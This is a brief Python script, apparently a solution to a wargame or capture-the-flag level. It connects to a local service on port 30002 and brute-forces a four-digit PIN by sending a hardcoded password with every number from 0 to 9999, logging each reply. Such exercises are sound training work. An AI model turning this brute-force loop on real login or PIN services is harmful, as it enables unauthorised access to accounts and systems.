#!/usr/bin/python
# h15h4m

import socket

current_pass =  "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ";

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect( ("localhost", 30002 ));

print s.recv(1024)

f = open("result", 'w')

i = 0

while i < 10000:
    s.send(current_pass + " " + str( i)  +"\r\n")
    f.write(s.recv(1024) + '\n')
    i = i + 1 

s.close()
f.close()

